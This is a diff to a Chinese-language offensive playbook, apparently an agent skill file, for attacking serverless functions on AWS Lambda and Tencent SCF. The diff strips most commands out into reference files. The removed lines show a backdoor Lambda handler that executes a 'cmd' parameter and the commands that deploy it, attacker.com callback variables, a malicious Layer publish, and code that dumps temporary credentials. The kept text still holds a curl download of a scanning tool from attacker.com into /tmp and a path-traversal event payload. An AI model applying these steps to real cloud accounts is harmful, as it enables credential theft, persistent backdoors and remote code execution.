@@ -10,74 +10,27 @@ metadata:
 
 Serverless 函数运行在短暂的容器中，传统的持久化和横向移动思路不适用。攻击重点是：事件注入（输入篡改）、凭据提取（环境变量/临时 Token）、代码注入（修改函数代码）。
 
-## Phase 0: 信息收集
+## 按云平台查阅详细命令
 
-### 0.1 发现 Serverless 函数
+识别云平台后，加载对应 reference 获取完整命令：
 
-```bash
-# AWS Lambda
-aws lambda list-functions --region us-east-1
-aws lambda list-functions --region ap-southeast-1
-# 遍历所有 region
-for r in us-east-1 us-west-2 eu-west-1 ap-northeast-1 ap-southeast-1; do
-  echo "=== $r ===" && aws lambda list-functions --region $r --query 'Functions[].FunctionName' 2>/dev/null
-done
+- AWS Lambda → [references/lambda-techniques.md](references/lambda-techniques.md)
+- 腾讯云 SCF → [references/scf-techniques.md](references/scf-techniques.md)
 
-# 腾讯云 SCF
-tccli scf ListFunctions --Namespace default --Limit 100
-tccli scf ListNamespaces  # 可能有多个命名空间
+## Phase 0: 通用信息收集
 
-# 阿里云 FC
-aliyun fc GET /services
-```
-
-### 0.2 获取函数详情
-
-```bash
-# AWS — 代码 + 配置 + 环境变量
-aws lambda get-function --function-name FUNC_NAME
-aws lambda get-function-configuration --function-name FUNC_NAME
-
-# 腾讯云
-tccli scf GetFunction --FunctionName FUNC_NAME --Namespace default
-```
+不论哪个云平台，第一步都是枚举函数列表、获取函数详情（代码 + 配置 + 环境变量）。具体命令参见对应 reference。
 
 ## Phase 1: 环境变量提取（最快获取凭据的方式）
 
-开发者经常在环境变量中硬编码数据库密码、API Key、其他服务凭据：
+开发者经常在环境变量中硬编码数据库密码、API Key、其他服务凭据。常见敏感变量名：
 
-```bash
-# AWS Lambda
-aws lambda get-function-configuration --function-name FUNC_NAME \
-  --query 'Environment.Variables' --output json
-# 常见敏感变量名：
-# DB_PASSWORD, DATABASE_URL, MONGODB_URI
-# AWS_ACCESS_KEY_ID（嵌套凭据）
-# SECRET_KEY, JWT_SECRET, API_KEY
-# REDIS_URL, SMTP_PASSWORD
-
-# 腾讯云 SCF
-tccli scf GetFunction --FunctionName FUNC_NAME \
-  --query 'Environment.Variables'
-# 常见：TENCENTCLOUD_SECRET_ID, DB_HOST, DB_PASSWORD
-```
+- `DB_PASSWORD`, `DATABASE_URL`, `MONGODB_URI`
+- `AWS_ACCESS_KEY_ID`（嵌套凭据）、`TENCENTCLOUD_SECRET_ID`
+- `SECRET_KEY`, `JWT_SECRET`, `API_KEY`
+- `REDIS_URL`, `SMTP_PASSWORD`
 
 ## Phase 2: 函数代码分析
-
-### 2.1 下载代码
-
-```bash
-# AWS — 获取代码下载 URL
-CODE_URL=$(aws lambda get-function --function-name FUNC_NAME \
-  --query 'Code.Location' --output text)
-curl -o lambda_code.zip "$CODE_URL"
-unzip lambda_code.zip -d lambda_code/
-
-# 腾讯云（代码在 GetFunction 响应中）
-tccli scf GetFunction --FunctionName FUNC_NAME --query 'Code'
-```
-
-### 2.2 代码审计要点
 
 ```python
 # 搜索硬编码凭据
@@ -98,9 +51,9 @@ cat lambda_code/package.json      # Node.js
 
 Serverless 函数通过"事件"触发，事件数据就是输入——如果函数没有正确校验事件数据，就可以注入。
 
-### 3.1 API Gateway → Lambda 注入
+### 3.1 API Gateway → Lambda/SCF 注入
 
-API Gateway 将 HTTP 请求封装为事件传给 Lambda：
+API Gateway 将 HTTP 请求封装为事件传给函数：
 
 ```json
 {
@@ -127,7 +80,7 @@ API Gateway 将 HTTP 请求封装为事件传给 Lambda：
   "Records": [{
     "s3": {
       "bucket": {"name": "my-bucket"},
-      "object": {"key": "../../../etc/passwd"}  // 路径遍历
+      "object": {"key": "../../../etc/passwd"}
     }
   }]
 }
@@ -145,75 +98,17 @@ SQS/CMQ/Kafka 消息作为事件传入：
 
 ## Phase 4: 代码注入/覆盖
 
-### 4.1 修改函数代码（需要 UpdateFunctionCode 权限）
+需要 UpdateFunctionCode 权限。具体命令参见对应云平台 reference。
 
-```bash
-# AWS — 用恶意代码替换函数
-cat > /tmp/lambda_backdoor.py << 'EOF'
-import os, json
-def lambda_handler(event, context):
-    # 原始功能 + 后门
-    cmd = event.get('cmd', 'id')
-    output = os.popen(cmd).read()
-    return {'statusCode': 200, 'body': json.dumps({'output': output})}
-EOF
-cd /tmp && zip lambda_backdoor.zip lambda_backdoor.py
-aws lambda update-function-code --function-name FUNC_NAME \
-  --zip-file fileb:///tmp/lambda_backdoor.zip
+核心思路：用恶意代码替换函数，让函数既执行原始功能又植入后门（如接受 cmd 参数执行命令）。
 
-# 腾讯云
-tccli scf UpdateFunctionCode --FunctionName FUNC_NAME \
-  --Handler index.main_handler --CosBucketName xxx --CosObjectName code.zip
-```
+### Layer 劫持（AWS Lambda 特有）
 
-### 4.2 修改环境变量（注入凭据或后门配置）
-
-```bash
-# AWS
-aws lambda update-function-configuration --function-name FUNC_NAME \
-  --environment '{"Variables":{"BACKDOOR_URL":"http://attacker.com/callback"}}'
-
-# 腾讯云
-tccli scf UpdateFunctionConfiguration --FunctionName FUNC_NAME \
-  --Environment '{"Variables":[{"Key":"BACKDOOR","Value":"http://attacker.com"}]}'
-```
-
-### 4.3 Layer 劫持
-
-Lambda Layers 是共享的代码库，修改 Layer 可以影响所有使用它的函数：
-
-```bash
-# 列出函数使用的 Layers
-aws lambda get-function-configuration --function-name FUNC_NAME --query 'Layers'
-
-# 发布恶意 Layer（替换依赖库）
-# 比如替换 requests 库，在 __init__.py 中注入后门
-aws lambda publish-layer-version --layer-name shared-lib \
-  --zip-file fileb://malicious_layer.zip
-```
+Lambda Layers 是共享的代码库，修改 Layer 可以影响所有使用它的函数。详见 [references/lambda-techniques.md](references/lambda-techniques.md)。
 
 ## Phase 5: Runtime 环境利用
 
-### 5.1 临时凭据
-
-每个 Lambda/SCF 运行时都有临时凭据（来自函数的执行角色）：
-
-```python
-# 在函数代码中或通过 RCE 获取
-import os
-print(os.environ.get('AWS_ACCESS_KEY_ID'))
-print(os.environ.get('AWS_SECRET_ACCESS_KEY'))
-print(os.environ.get('AWS_SESSION_TOKEN'))
-
-# 腾讯云 SCF
-print(os.environ.get('TENCENTCLOUD_SECRETID'))
-print(os.environ.get('TENCENTCLOUD_SECRETKEY'))
-print(os.environ.get('TENCENTCLOUD_SESSIONTOKEN'))
-```
-
-这些凭据的权限就是函数执行角色的权限——可能比泄露的 AK/SK 权限更高。
-
-### 5.2 /tmp 目录利用
+### /tmp 目录利用
 
 Serverless 函数的 /tmp 是唯一可写目录，且在"热启动"时会保留：
 
@@ -229,6 +124,7 @@ curl -o /tmp/fscan http://attacker.com/fscan && chmod +x /tmp/fscan
 
 ```
 发现 Serverless 函数
+├── 识别云平台 → 加载对应 reference（lambda-techniques / scf-techniques）
 ├── 有 GetFunction 权限 → 下载代码 → 审计 → 找漏洞/凭据
 ├── 有 GetFunctionConfiguration 权限 → 读环境变量 → 提取凭据
 ├── 有 UpdateFunctionCode 权限 → 注入后门 → RCE
